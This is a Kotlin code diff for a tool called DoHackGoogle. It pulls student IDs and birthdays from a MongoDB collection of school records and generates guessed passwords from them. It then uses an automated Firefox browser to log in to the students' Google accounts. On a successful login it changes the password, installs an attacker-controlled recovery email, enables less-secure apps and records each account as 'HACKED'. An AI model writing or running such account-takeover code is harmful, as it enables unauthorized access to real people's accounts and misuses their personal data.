@@ -1,40 +1,70 @@
 package net.scr0pt.thirdservice.google
 
-import net.scr0pt.selenium.PageManager
-import net.scr0pt.selenium.Response
 import com.mongodb.client.MongoClients
 import com.mongodb.client.MongoCollection
+import com.mongodb.client.model.Filters
 import com.mongodb.client.model.Updates
-import net.scr0pt.crawl.school.random
 import net.scr0pt.selenium.GoogleResponse
+import net.scr0pt.selenium.PageManager
+import net.scr0pt.selenium.Response
 import net.scr0pt.thirdservice.mongodb.MongoConnection
-import org.bson.Document
-
 import net.scr0pt.utils.webdriver.DriverManager
+import org.bson.Document
+import java.util.*
 
 
 fun main(args: Array<String>) {
-    DoHackGoogle().run()
+    val mongoClient = MongoClients.create(MongoConnection.eduConnection!!)
+    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
+    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("oude-student-infomation-2")
+//    collection.find().forEach {
+//        val birthday = it.getString("NGÀY SINH")
+//        if(birthday.endsWith(".0")){
+//            println(birthday)
+//            collection.updateOne(
+//                    Document("MSSV", it.getString("MSSV")),
+//                    Updates.set("NGÀY SINH", birthday.removeSuffix(".0"))
+//            )
+//        }
+//    }
+
+//    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
+
+//    DoHackGoogle(collection){
+//         it.getString("pass")
+//    }.run()
+    DoHackGoogle(collection) {
+        val birthday = it.getString("NGÀY SINH").replace("/", "")
+        val mssv = it.getString("MSSV")
+        "!$mssv$birthday@"
+    }.run()
+//    DoHackGoogle(collection).run()
 }
 
 
-class DoHackGoogle() {
-    val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = true)
-    val mongoClient = MongoClients.create(MongoConnection.eduConnection!!)
-    val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
-    val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
-
+class DoHackGoogle(val collection: MongoCollection<Document>, val generatePassword: (Document) -> String?) {
+    val driverManager = DriverManager(driverType = DriverManager.BrowserType.Firefox, driverHeadless = false)
     var captchaCount = 0
 
+
     fun run() {
-        while (captchaCount < 10) {
-            collection.random(Document("login_status", null).append("email_status", null))?.let { googleRun(it) }
+        if (captchaCount < 10) {
+//        while (captchaCount < 10) {
+            collection.find(Filters.and(
+                    Filters.exists("email"),
+                    Filters.not(Document("email", ""))
+            )).forEach {
+                val email = it.getString("email") ?: return@forEach
+                val password_status = it.getList("password_status", Document::class.java)
+                val pass = generatePassword(it) ?: return@forEach
+                if (password_status == null || password_status.none { it.getString("password") == pass }) {
+                    googleRun(email, pass)
+                }
+            }
         }
     }
 
-    fun googleRun(doc: Document) {
-        val email = doc.getString("email") ?: return
-        val pass = doc.getString("pass") ?: return
+    private fun googleRun(email: String, pass: String) {
         val recoverEmail = "scr0pt.son@gmail.com"
         val newPassword = "TheMatrix@1999"
         println("email: $email | pass: $pass | recoverEmail: $recoverEmail | newPassword: $newPassword")
@@ -45,57 +75,30 @@ class DoHackGoogle() {
             addPageList(arrayListOf(
                     LoginEnterEmailPage(email),
                     LoginEnterPasswordPage(pass) {
-                        update(email, "login_status", "PASSWORD_CORRECT")
+                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_CORRECT)
                     },
                     WellcomeToNewAccount {
-                        update(email, "email_status", "HACKED")
+                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
                     },
                     ChangePasswordFirstTime(newPassword) {
-                        update(email, "email_status", "HACKED")
-                        update(email, "new_pass", newPassword)
-                        println("ChangePasswordFirstTime success")
+                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
+                        updatePassword(email, newPassword, PASSWORD_STATUS.NEW_PASSWORD)
                     },
-                    EnterPasswordFirstTimeChanged(newPassword) {
-                        println("EnterPasswordFirstTimeChanged success")
-                    },
-                    ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
-                        println("ProtectYourAccount success")
-                    },
-                    ProtectYourAccountUpdatePhone() {
-                        println("ProtectYourAccountUpdatePhone success")
-                    },
+                    EnterPasswordFirstTimeChanged(newPassword),
+                    ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE),
+                    ProtectYourAccountUpdatePhone(),
                     ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
-                        println("ProtectYourAccountUpdateRecoverEmail success")
                         update(email, "recover_email", recoverEmail)
                     },
                     ProtectYourAccountUpdateRecoverEmailSuccess {
                         update(email, "recover_email", recoverEmail)
-                        println("ProtectYourAccountUpdateRecoverEmailSuccess success")
                     },
-                    GoogleSearch {
-                        println("GoogleSearch success")
-                    },
-                    AccountDisable {
-                        //                    collection.updateOne(
-//                        Document("email", email),
-//                        Updates.combine(Updates.set("hacked", "AccountDisable"))
-//                    )
-                        println("AccountDisable success")
-                    },
-                    VerifyItsYouAction {
-                        println("VerifyItsYouAction success")
-                    },
-                    VerifyItsYouPhoneNumber {
-                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                        println("VerifyItsYou success")
-                    },
-                    VerifyItsYouPhoneNumberRecieveMessage {
-                        println("VerifyItsYouPhoneNumberRecieveMessage success")
-                    },
-                    CantLoginForYou {
-                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                        println("CantLoginForYou success")
-                    }
+                    GoogleSearch(),
+                    AccountDisable(),
+                    VerifyItsYouAction(),
+                    VerifyItsYouPhoneNumber(),
+                    VerifyItsYouPhoneNumberRecieveMessage(),
+                    CantLoginForYou()
             ))
 
             generalWatingResult = { pageStatus ->
@@ -107,15 +110,22 @@ class DoHackGoogle() {
             run { pageResponse ->
                 when (pageResponse) {
                     is Response.OK -> {
-                        update(email, "email_status", "HACKED")
+                        updateEmailStatus(email, EMAIL_STATUS.HACKED)
                         allowLessSecureApps(driver, email, collection)
                         driver.renew()
                     }
-                    is GoogleResponse.NOT_FOUND_EMAIL -> {
-                        update(email, "email_status", "NOT_EXIST")
+                    is GoogleResponse.ACCOUNT_DISABLE -> {
+                        updateEmailStatus(email, EMAIL_STATUS.AccountDisable)
+                        driver.renew()
                     }
-                    is GoogleResponse.INCORECT_PASSWORD, is GoogleResponse.PASSWORD_CHANGED -> {
-                        update(email, "login_status", "PASSWORD_INCORRECT")
+                    is GoogleResponse.NOT_FOUND_EMAIL -> {
+                        updateEmailStatus(email, EMAIL_STATUS.NOT_EXIST)
+                    }
+                    is GoogleResponse.INCORECT_PASSWORD -> {
+                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_INCORRECT)
+                    }
+                    is GoogleResponse.PASSWORD_CHANGED -> {
+                        updatePassword(email, pass, PASSWORD_STATUS.PASSWORD_CHANGED)
                     }
                     is GoogleResponse.RECAPTCHA -> {
                         driver.renew()
@@ -126,7 +136,7 @@ class DoHackGoogle() {
                     }
                 }
 
-                if(pageResponse is GoogleResponse.RECAPTCHA ) captchaCount++
+                if (pageResponse is GoogleResponse.RECAPTCHA) captchaCount++
                 else captchaCount = 0
 
                 println(pageResponse)
@@ -138,5 +148,26 @@ class DoHackGoogle() {
     fun update(email: String, key: String, value: String) {
         println("Update set $key to $value when email is $email")
         collection.updateOne(Document("email", email), Updates.combine(Updates.set(key, value)))
+    }
+
+
+    enum class EMAIL_STATUS {
+        AccountDisable, NOT_EXIST, HACKED
+    }
+
+    fun updateEmailStatus(email: String, status: EMAIL_STATUS) {
+        update(email, "email_status", status.toString())
+    }
+
+    enum class PASSWORD_STATUS {
+        PASSWORD_CHANGED, PASSWORD_INCORRECT, PASSWORD_CORRECT, NEW_PASSWORD
+    }
+
+    fun updatePassword(email: String, pass: String, status: PASSWORD_STATUS) {
+        println("Update password set $pass to $status when email is $email")
+        collection.updateOne(
+                Document("email", email),
+                Updates.push("password_status", Document("password", pass).append("status", status.toString()).append("updated_at", Date()))
+        )
     }
 }
